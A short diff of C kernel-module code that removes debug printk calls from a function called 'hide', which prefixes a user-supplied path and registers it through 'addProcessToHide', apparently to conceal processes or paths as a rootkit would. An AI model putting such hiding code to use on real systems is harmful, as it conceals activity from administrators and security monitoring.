@@ -27,12 +27,10 @@ int hide(const char __user *path) {
   if (IS_ERR_OR_NULL(_path))
     return -ENOMEM;
   result = strncpy_from_user(_path, path, PATH_MAX);
-  printk("here\n");
   if (result < 0) {
     kfree(_path);
     return result;
   }
-  printk("%s\n", _path);
   tempPath = kcalloc(strlen(_path) + strlen(hide__prefix) + 1,1,GFP_KERNEL);
   if(IS_ERR_OR_NULL(tempPath)){
     kfree(_path);
@@ -40,7 +38,6 @@ int hide(const char __user *path) {
   }
   strcpy(tempPath, hide__prefix);
   strcat(tempPath, _path);
-  printk("%s\n", tempPath);
   //      printk("%s",tempPath);
   result = addProcessToHide(tempPath);
   kfree(_path);
